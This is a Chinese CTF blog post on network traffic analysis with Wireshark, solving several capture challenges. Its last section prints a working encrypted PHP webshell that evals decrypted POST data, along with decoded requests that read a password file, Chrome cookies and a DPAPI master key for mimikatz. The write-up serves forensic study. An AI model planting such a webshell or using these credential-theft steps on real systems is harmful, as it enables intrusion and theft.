@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言最近对流量分析产生了浓厚的兴趣,做些题，学习一下，流量分析，重点在于对流量数据的提取，工具基本就是wireshark了。 参考：https:&#x2F;&#x2F;jwt1399.top&#x2F;2019&#x2F;07&#x2F;29&#x2F;ctf-liu-liang-fen-xi-zong-jie&#x2F;#toc-heading-15 入门题Cephalopodhint:我们发现一些奇怪的网络流量，我们怀疑它包含一个flag 根据hint，分组字节">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Network-Traffic-Analysis">
+<meta property="og:url" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/index.html">
+<meta property="og:site_name" content="一giao我里giao">
+<meta property="og:description" content="前言最近对流量分析产生了浓厚的兴趣,做些题，学习一下，流量分析，重点在于对流量数据的提取，工具基本就是wireshark了。 参考：https:&#x2F;&#x2F;jwt1399.top&#x2F;2019&#x2F;07&#x2F;29&#x2F;ctf-liu-liang-fen-xi-zong-jie&#x2F;#toc-heading-15 入门题Cephalopodhint:我们发现一些奇怪的网络流量，我们怀疑它包含一个flag 根据hint，分组字节">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/7.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/8.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/9.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/10.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/11.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/12.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/22.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/23.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/24.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/25.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/13.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/14.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/15.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/16.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/17.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/18.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/19.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/20.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/21.png">
+<meta property="article:published_time" content="2020-03-26T03:50:00.000Z">
+<meta property="article:modified_time" content="2020-04-26T03:56:24.241Z">
+<meta property="article:author" content="wuwuwu">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/1.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Network-Traffic-Analysis | 一giao我里giao</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">一giao我里giao</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/26/Network-Traffic-Analysis/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wuwuwu">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="一giao我里giao">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Network-Traffic-Analysis
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-03-26 11:50:00" itemprop="dateCreated datePublished" datetime="2020-03-26T11:50:00+08:00">2020-03-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-04-26 11:56:24" itemprop="dateModified" datetime="2020-04-26T11:56:24+08:00">2020-04-26</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近对流量分析产生了浓厚的兴趣,做些题，学习一下，流量分析，重点在于对流量数据的提取，工具基本就是wireshark了。</p>
+<p>参考：<a href="https://jwt1399.top/2019/07/29/ctf-liu-liang-fen-xi-zong-jie/#toc-heading-15" target="_blank" rel="noopener"><a href="https://jwt1399.top/2019/07/29/ctf-liu-liang-fen-xi-zong-jie/#toc-heading-15" target="_blank" rel="noopener">https://jwt1399.top/2019/07/29/ctf-liu-liang-fen-xi-zong-jie/#toc-heading-15</a></a></p>
+<h1 id="入门题"><a href="#入门题" class="headerlink" title="入门题"></a>入门题</h1><h2 id="Cephalopod"><a href="#Cephalopod" class="headerlink" title="Cephalopod"></a>Cephalopod</h2><p>hint:我们发现一些奇怪的网络流量，我们怀疑它包含一个flag</p>
+<p>根据hint，分组字节流查找flag字段</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/1.png" alt></p>
+<p>发现在流量中有flag.png文件。</p>
+<p>在 tcp.stream eq 2 中找到了flag.png文件。</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/2.png" alt></p>
+<p>以原始数据保存成flag.png，删除掉头部中没有用的信息</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/3.png" alt></p>
+<p>如下图：</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/4.png" alt></p>
+<p>保存，获得flag。</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/5.png" alt></p>
+<h2 id="特殊后门"><a href="#特殊后门" class="headerlink" title="特殊后门"></a>特殊后门</h2><p>hint:</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/6.png" alt></p>
+<p>这题有点脑洞，在icmp中查找flag</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/7.png" alt="1572584591707"></p>
+<p>然后从这条icmp报文以后的内容中包含flag的一个字符。</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/8.png" alt="1572584666124"></p>
+<p>全部拼完，会得到flag</p>
+<h1 id="进阶题"><a href="#进阶题" class="headerlink" title="进阶题"></a>进阶题</h1><h2 id="抓住一只苍蝇"><a href="#抓住一只苍蝇" class="headerlink" title="抓住一只苍蝇"></a>抓住一只苍蝇</h2><p>题目给的hint是抓住一只苍蝇…..</p>
+<p>过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains <span class="string">"苍蝇"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/26/Network-Traffic-Analysis/9.png" alt></p>
+<p> 猜测是在发送邮件，并且发送了压缩包 fly.rar</p>
+<p>过滤数据包</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.requests.post</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/26/Network-Traffic-Analysis/10.png" alt></p>
+<p>第一个数据包调用了函数createFile()，猜测后面的五个数据包为fly.rar的内容。</p>
+<p>导出HTTP对象</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/11.png" alt></p>
+<p>分别保存成1,2,3,4,5文件，然后由于这是一个tcp包，没一次传输都会带上tcp头文件</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/12.png" alt></p>
+<p>一个数据包的大小是525701字节，然后这五个数据包的大小又是 131*1024 * 4+1777 = 527521</p>
+<p>那么每个tcp头的大小就是：（527521-525701）/ 4 = 364 字节</p>
+<p>然后我们使用dd命令分离这五个数据包的数据部分</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=<span class="number">1</span> bs=<span class="number">1</span> skip=<span class="number">364</span> of=<span class="number">1.1</span></span><br><span class="line">dd <span class="keyword">if</span>=<span class="number">2</span> bs=<span class="number">1</span> skip=<span class="number">364</span> of=<span class="number">2.1</span></span><br><span class="line">dd <span class="keyword">if</span>=<span class="number">3</span> bs=<span class="number">1</span> skip=<span class="number">364</span> of=<span class="number">3.1</span></span><br><span class="line">dd <span class="keyword">if</span>=<span class="number">4</span> bs=<span class="number">1</span> skip=<span class="number">364</span> of=<span class="number">4.1</span></span><br><span class="line">dd <span class="keyword">if</span>=<span class="number">5</span> bs=<span class="number">1</span> skip=<span class="number">364</span> of=<span class="number">5.1</span></span><br><span class="line"></span><br><span class="line">dd命令语法：</span><br><span class="line"><span class="keyword">if</span> 输入文件名</span><br><span class="line">bs 设置每次读写块的大小为<span class="number">1</span>字节 </span><br><span class="line">skip 指定从输入文件开头跳过多少个块后再开始复制</span><br><span class="line">of 输出文件名</span><br></pre></td></tr></table></figure>
+
+<p>接着</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="number">1.1</span> <span class="number">2.1</span> <span class="number">3.1</span> <span class="number">4.1</span> <span class="number">5.1</span> &gt; fly.rar</span><br></pre></td></tr></table></figure>
+
+<p>获得fly.rar后，伪加密。修改一下二进制文件。解压，binwalk就好了…..</p>
+<h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><p>流量分析题的思路,个人认为除非是脑洞题….但是现在脑洞题很少了,所以分析流量数据要想想流量中的数据体现的是什么…….</p>
+<h2 id="360初赛流量分析题"><a href="#360初赛流量分析题" class="headerlink" title="360初赛流量分析题"></a>360初赛流量分析题</h2><p><img src="/2020/03/26/Network-Traffic-Analysis/22.png" alt></p>
+<p>过滤只留下http的数据,我们可以看到这里的数据告诉我们黑客是在进行sql注入,仔细一看,这个实在sql盲注,然后如果盲注的结果为true的话,返回的数据长度就是987,如果盲注的结果为false的话,那返回的数据长度就是1003.既然是盲注.那么最后黑客总是要注出点东西的.直接看到最后面</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/23.png" alt="1573717977085"></p>
+<p>发现他在注数据库中的passwd还有url</p>
+<p>passwd:bkis</p>
+<p>url:t.cn/Ai8PhqSb</p>
+<p>访问这个百度网盘,获得flag.zip压缩包,并且我们导出HTTP对象,发现一个readme.7z,解压后有一个readme.txt</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/24.png" alt="1573718847926"></p>
+<p>而且flag.zip中有一个readme.txt,尝试使用明文攻击.</p>
+<p>使用7z对readme.txt进行压缩</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/25.png" alt="1573719256684"></p>
+<h2 id="360复赛流量分析题"><a href="#360复赛流量分析题" class="headerlink" title="360复赛流量分析题"></a>360复赛流量分析题</h2><p>第19 条数据</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/13.png" alt></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $key=substr(md5(uniqid(rand())),<span class="number">16</span>);</span><br><span class="line">    $_SESSION[<span class="string">'k'</span>]=$key;</span><br><span class="line">    <span class="keyword">print</span> $key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $key=$_SESSION[<span class="string">'k'</span>];</span><br><span class="line">	$post=file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line">	<span class="keyword">if</span>(!extension_loaded(<span class="string">'openssl'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$t=<span class="string">"base64_"</span>.<span class="string">"decode"</span>;</span><br><span class="line">		$post=$t($post.<span class="string">""</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">    			 $post[$i] = $post[$i]^$key[$i+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$post=openssl_decrypt($post, <span class="string">"AES128"</span>, $key);</span><br><span class="line">	&#125;</span><br><span class="line">    $arr=explode(<span class="string">'|'</span>,$post);</span><br><span class="line">    $func=$arr[<span class="number">0</span>];</span><br><span class="line">    $params=$arr[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($p)</span> </span>&#123;<span class="keyword">eval</span>($p.<span class="string">""</span>);&#125;&#125;</span><br><span class="line">	@<span class="keyword">new</span> C($params);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这段代码,是传了一个木马上去,然后通过一个pass获得一个key.</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/14.png" alt></p>
+<p>这里上传pass,获得一个key.</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/15.png" alt></p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/16.png" alt></p>
+<p>接着我们会看到它,后面就一直在post一些数据上去….</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/17.png" alt></p>
+<p>根据它给的密文,以及他上传的shell,编写解码demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $post=$_POST[<span class="string">'post'</span>];</span><br><span class="line">    $key=d59042be6e437849;</span><br><span class="line">    $post=openssl_decrypt($post,<span class="string">"AES128"</span>, $key);</span><br><span class="line">    $arr=explode(<span class="string">'|'</span>,$post);</span><br><span class="line">    $func=$arr[<span class="number">0</span>];</span><br><span class="line">    $params=$arr[<span class="number">1</span>];</span><br><span class="line">    var_dump($func);</span><br><span class="line">    var_dump($params);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>http数据包320</p>
+<p>解码结果:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path=<span class="string">"C:/Users/shadow/Desktop/password.txt"</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>http数据包501</p>
+<p>解码结果:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path=<span class="string">"C:/Users/shadow/AppData/Local/Google/Chrome/User Data/Default/Cookies"</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>http数据包653</p>
+<p>解码结果:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path=<span class="string">"C:/Users/shadow/AppData/Roaming/Microsoft/Protect/S-1-5-21-2127750816-4215895028-2373289296-1001/6ecf76bd-1803-437e-92e6-28dd36c907aa"</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>http请求返回的数据像这样</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/18.png" alt></p>
+<p>看这请求的数据我们也能知道,这个黑客是在读取这个Chrome的cookie.</p>
+<p>第一个数据返回的是password:p@ssw0rd</p>
+<p>第三个数据返回的masterkey-file</p>
+<p>第二个返回的是cookie</p>
+<p>我们的目的是解密cookie,使用工具mimikatz可以解密.</p>
+<p>参考文章: <a href="https://xz.aliyun.com/t/6508" target="_blank" rel="noopener"><a href="https://xz.aliyun.com/t/6508" target="_blank" rel="noopener">https://xz.aliyun.com/t/6508</a></a></p>
+<p>​                  <a href="https://bbs.pediy.com/thread-247634-1.htm" target="_blank" rel="noopener"><a href="https://bbs.pediy.com/thread-247634-1.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247634-1.htm</a></a></p>
+<p>我们可以使用masterkey_file和password获得获得masterkey,其中masterkey的位置要和数据包中给的一样.</p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/19.png" alt></p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/20.png" alt></p>
+<p><img src="/2020/03/26/Network-Traffic-Analysis/21.png" alt></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/21/weblogic%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="weblogic历史漏洞复现">
+      <i class="fa fa-chevron-left"></i> weblogic历史漏洞复现
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/03/30/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="thinkphp5.1反序列化">
+      thinkphp5.1反序列化 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#入门题"><span class="nav-number">2.</span> <span class="nav-text">入门题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Cephalopod"><span class="nav-number">2.1.</span> <span class="nav-text">Cephalopod</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#特殊后门"><span class="nav-number">2.2.</span> <span class="nav-text">特殊后门</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#进阶题"><span class="nav-number">3.</span> <span class="nav-text">进阶题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#抓住一只苍蝇"><span class="nav-number">3.1.</span> <span class="nav-text">抓住一只苍蝇</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#练习"><span class="nav-number">4.</span> <span class="nav-text">练习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#360初赛流量分析题"><span class="nav-number">4.1.</span> <span class="nav-text">360初赛流量分析题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#360复赛流量分析题"><span class="nav-number">4.2.</span> <span class="nav-text">360复赛流量分析题</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">wuwuwu</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">60</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wuwuwu</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
